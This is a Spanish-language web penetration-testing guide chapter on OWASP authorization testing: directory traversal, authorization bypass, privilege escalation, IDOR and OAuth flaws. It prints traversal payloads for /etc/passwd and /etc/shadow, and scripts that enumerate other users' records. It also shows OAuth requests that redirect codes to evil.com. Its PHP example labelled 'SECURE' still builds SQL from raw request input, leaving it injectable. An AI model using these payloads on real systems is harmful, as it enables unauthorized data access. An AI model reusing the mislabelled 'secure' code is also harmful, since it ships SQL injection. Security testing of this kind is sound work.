# Fase 5: Authorization Testing (WSTG-ATHZ)

## Objetivo
Evaluar el mecanismo de autorización de la aplicación web para identificar vulnerabilidades que permitan acceso no autorizado a recursos, escalada de privilegios o bypass de controles de acceso.

## Descripción General
La autorización es el proceso de determinar si un usuario autenticado tiene permiso para realizar una acción específica o acceder a un recurso particular. Un control de autorización deficiente puede permitir que usuarios accedan a funcionalidades o datos para los cuales no están autorizados.

## Tests Incluidos

### WSTG-ATHZ-01: Testing Directory Traversal File Include
**Objetivo**: Identificar vulnerabilidades de directory traversal y file inclusion
**Vectores de ataque:**
```bash
# Directory traversal básico
../../../etc/passwd
..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# File inclusion
?page=/etc/passwd
?include=config.php
?file=../../../../etc/passwd
?document=../../../../windows/win.ini

# Encoding bypass
..%252f..%252f..%252fetc%2fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

**Herramientas Kali:**
```bash
# Escaneo automatizado con Dirb
dirb http://target.com /usr/share/wordlists/dirb/vulns.txt

# Prueba con Feroxbuster
feroxbuster -u http://target.com -x php,asp,txt -w /usr/share/wordlists/common.txt

# Testing manual con Curl
curl "http://target.com/download.php?file=../../../../etc/passwd"
```

### WSTG-ATHZ-02: Testing for Bypassing Authorization Schema
**Objetivo**: Identificar métodos para bypass del esquema de autorización
**Técnicas de bypass:**
```bash
# Manipulación de parámetros
/admin/user?id=1&admin=true
/admin/user?id=1&role=admin
/api/data?user_id=1&force_access=true

# Bypass por ID manipulation
/profile?user_id=1      # Intentar con diferentes IDs
/api/order?order_id=1    # Ver si se pueden acceder a órdenes de otros usuarios
/download?file_id=1      # Acceder a archivos de otros usuarios

# Bypass por headers HTTP
curl -H "X-User-ID: 1" http://target.com/admin/users
curl -H "X-Role: admin" http://target.com/protected/resource
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
```

### WSTG-ATHZ-03: Testing for Privilege Escalation
**Objetivo**: Identificar vías de escalada de privilegios
**Escenarios comunes:**
- Crear usuario con rol administrativo
- Modificar parámetros para obtener permisos elevados
- Explotación de funciones de gestión de usuarios
- Bypass de validaciones de rol

```python
# Ejemplo de escalada de privilegios
POST /api/users/create
{
    "username": "newuser",
    "email": "newuser@test.com",
    "role": "admin",      # Intentar asignar rol admin
    "permissions": ["all"]
}

PUT /api/users/1
{
    "role": "administrator"
}
```

### WSTG-ATHZ-04: Testing for Insecure Direct Object References (IDOR)
**Objetivo**: Identificar referencias inseguras a objetos directos
**Patrones de IDOR:**
```bash
# ID en parámetros URL
/profile?id=123      # Intentar 124, 999, 0
/order?id=456        # Intentar acceder a órdenes de otros usuarios
/download?file_id=789 # Intentar diferentes IDs

# ID en rutas API
/api/users/123/orders
/api/documents/456/download
/api/invoices/789/view

# Ejemplo de testing con burpsuite
# 1. Login como usuario normal
# 2. Acceder a recurso con ID propio
# 3. Modificar ID y verificar acceso
```

**Herramientas para detectar IDOR:**
```bash
# Automatización con Custom scripts
for id in {1..1000}; do
    response=$(curl -s "http://target.com/api/users/$id/profile")
    if [[ $response != *"Unauthorized"* ]]; then
        echo "Possible IDOR: $id"
    fi
done

# Con FFuf para fuzzing
ffuf -w ids.txt -u http://target.com/api/users/FUZZ/profile -mr "profile"
```

### WSTG-ATHZ-05: Testing for OAuth Weaknesses
**Objetivo**: Evaluar implementaciones OAuth para debilidades de seguridad
**Aspectos a verificar:**
- Configuración segura de OAuth
- Validación de tokens
- Scope management
- CSRF protection
- State parameter implementation

**Testing OAuth:**
```bash
# Testing de configuración
curl -X GET \
  "https://api.target.com/oauth/authorize?response_type=code&client_id=test&redirect_uri=http://evil.com&scope=read"

# Verificar scope management
# 1. Autenticar con scope=read
# 2. Intentar acceder a endpoints que requieren scope=write

# Testing de token reuse
curl -H "Authorization: Bearer TOKEN" \
     http://target.com/api/user/profile

# Verificar si el mismo token funciona en diferentes contextos
```

## Herramientas Kali Recomendadas

### **Herramientas Principales**
1. **Burp Suite** - Análisis y manipulación de tráfico HTTP
2. **OWASP ZAP** - Web application security scanner
3. **Nmap** - Escaneo de puertos y servicios
4. **Dirb/Gobuster** - Directory/file enumeration
5. **Feroxbuster** - Fast content discovery

### **Herramientas Especializadas**
1. **Sqlmap** - SQL Injection testing
2. **Cewl** - Custom wordlist generator
3. **Wfuzz** - Web application fuzzer
4. **Ffuf** - Fast web fuzzer
5. **Aria2** - Download utility para testing file inclusion

### **Scripts Personalizados**
```bash
# Script para detectar IDOR
#!/bin/bash
TARGET=$1
USER_ID=$2
for id in {1..100}; do
    if [ $id -ne $USER_ID ]; then
        echo "Testing ID: $id"
        curl -s "http://$TARGET/api/users/$id" | head -10
    fi
done

# Script para directory traversal
#!/bin/bash
TARGET=$1
PAYLOADS=(
    "../../../etc/passwd"
    "..%2f..%2f..%2fetc%2fpasswd"
    "....//....//....//etc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)
for payload in "${PAYLOADS[@]}"; do
    echo "Testing: $payload"
    curl -s "http://$TARGET/vuln.php?file=$payload" | head -5
done
```

## Técnicas de Testing Específicas

### **Directory Traversal Testing**
```bash
# Casos de prueba para directory traversal
traversal_payloads = [
    # Unix paths
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../proc/version",
    "../../../../etc/hosts",

    # Windows paths
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\..\\boot.ini",
    "..\\..\\..\\..\\windows\\win.ini",

    # Variaciones con encoding
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

    # Null byte injection
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg"
]
```

### **IDOR Testing Framework**
```python
def test_idor(base_url, session_token, legitimate_id):
    """Framework para testing IDOR"""

    # 1. Autenticar y obtener token
    session = requests.Session()
    session.headers['Authorization'] = f'Bearer {session_token}'

    # 2. Obtener recurso legítimo
    response = session.get(f'{base_url}/resource/{legitimate_id}')
    if response.status_code != 200:
        print("Error accessing legitimate resource")
        return

    # 3. Testing con IDs alterados
    test_ids = [1, 2, 999999, 0, -1, 'admin', 'null']

    for test_id in test_ids:
        response = session.get(f'{base_url}/resource/{test_id}')

        if response.status_code == 200:
            print(f"Possible IDOR: {test_id}")
            # Analizar contenido para confirmar acceso no autorizado
            analyze_response_content(response.json())
        elif response.status_code == 403:
            print(f"Properly protected: {test_id}")
```

### **OAuth Security Testing**
```bash
# Testing de configuración OAuth
oauth_test() {
    local target=$1

    # Test 1: Redirect URI manipulation
    echo "[*] Testing redirect URI manipulation..."
    curl -G \
        --data-urlencode "response_type=code" \
        --data-urlencode "client_id=legitimate_client" \
        --data-urlencode "redirect_uri=http://evil.com" \
        --data-urlencode "scope=read" \
        "$target/oauth/authorize"

    # Test 2: Scope manipulation
    echo "[*] Testing scope manipulation..."
    curl -G \
        --data-urlencode "response_type=code" \
        --data-urlencode "client_id=legitimate_client" \
        --data-urlencode "scope=admin write delete" \
        "$target/oauth/authorize"

    # Test 3: Client ID manipulation
    echo "[*] Testing client ID manipulation..."
    curl -G \
        --data-urlencode "response_type=code" \
        --data-urlencode "client_id=evil_client" \
        --data-urlencode "scope=read" \
        "$target/oauth/authorize"
}
```

## Patterns Comunes de Vulnerabilidad

### **Direct Object References Inseguras**
```php
// VULNERABLE: No validation de ownership
$user_id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $user_id";
$result = mysql_query($sql);

// SECURE: Validación de ownership
$user_id = $_SESSION['user_id'];
$resource_id = $_GET['id'];
$sql = "SELECT * FROM documents WHERE id = $resource_id AND user_id = $user_id";
$result = mysql_query($sql);
```

### **Authorization Bypass**
```javascript
// VULNERABLE: Frontend-only validation
function checkAdminRole() {
    return user.role === 'admin';  // Puede ser modificado en browser
}

// SECURE: Backend validation
app.get('/admin/users', (req, res) => {
    if (req.user.role !== 'admin') {
        return res.status(403).send('Forbidden');
    }
    // Lógica de admin
});
```

### **Directory Traversal**
```php
// VULNERABLE: No validation de file parameter
$file = $_GET['file'];
include($file);

// SECURE: Whitelist validation
$allowed_files = ['config.php', 'database.php'];
$file = $_GET['file'];
if (in_array($file, $allowed_files)) {
    include($file);
}
```

## Checklists de Verificación

### **Directory Traversal**
- [ ] Validación de parámetros de archivo
- [ ] Whitelist de archivos permitidos
- [ ] Sanitización de paths
- [ ] Proper error handling
- [ ] Validación de encoding

### **Authorization Schema**
- [ ] Validación backend de roles
- [ ] Double validation (frontend + backend)
- [ ] Proper session management
- [ ] CSRF protection
- [ ] Rate limiting

### **Direct Object References**
- [ ] Validación de ownership
- [ ] Access control lists
- [ ] Proper ID validation
- [ ] Randomization de IDs sensibles
- [ ] Logging de access attempts

### **OAuth Implementation**
- [ ] Proper client validation
- [ ] State parameter implementation
- [ ] Scope validation
- [ ] Token expiration
- [ ] Secure redirect URIs

## Métricas de Evaluación

### **Riesgo de Authorization**
- **Alto**: Acceso a datos de otros usuarios sin validación
- **Medio**: Acceso limitado a recursos sin ownership
- **Bajo**: Intentos de acceso denegados apropiadamente

### **Impacto de IDOR**
- **Crítico**: Acceso a información sensible (PII, financial data)
- **Alto**: Acceso a datos de otros usuarios
- **Medio**: Acceso limitado a funcionalidades
- **Bajo**: Intentos frustrados de IDOR

## Escenarios de Prueba

### **Escenario 1: IDOR en E-commerce**
```bash
# 1. Login como usuario normal
curl -X POST -d "email=user@test.com&password=test123" http://target.com/login

# 2. Ver pedidos propios
curl -H "Cookie: session=..." http://target.com/api/orders

# 3. Intentar acceder a pedidos de otros usuarios
for order_id in {1..1000}; do
    curl -H "Cookie: session=..." http://target.com/api/orders/$order_id
done
```

### **Escenario 2: Directory Traversal en File Upload**
```bash
# Testing file upload vulnerability
curl -X POST \
    -F "file=@/etc/passwd" \
    -F "filename=../../../etc/passwd" \
    http://target.com/upload

# Testing file inclusion
curl "http://target.com/view.php?file=../../../etc/passwd"
```

### **Escenario 3: OAuth Scope Bypass**
```python
# Testing OAuth scope enforcement
def test_oauth_scope_bypass():
    # 1. Obtener token con scope=read
    token = get_oauth_token(scope='read')

    # 2. Intentar acceder a endpoint que requiere scope=write
    response = requests.post(
        'http://target.com/api/data',
        headers={'Authorization': f'Bearer {token}'},
        json={'action': 'modify', 'data': 'test'}
    )

    # 3. Verificar si el acceso fue denegado
    if response.status_code == 200:
        print("Scope bypass successful!")
    else:
        print("Scope properly enforced")
```

## Referencias
- OWASP Authorization Cheat Sheet
- OWASP Top 10 - A01:2021 - Broken Access Control
- OWASP Testing Guide - Authorization Testing
- CWE-284: Improper Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key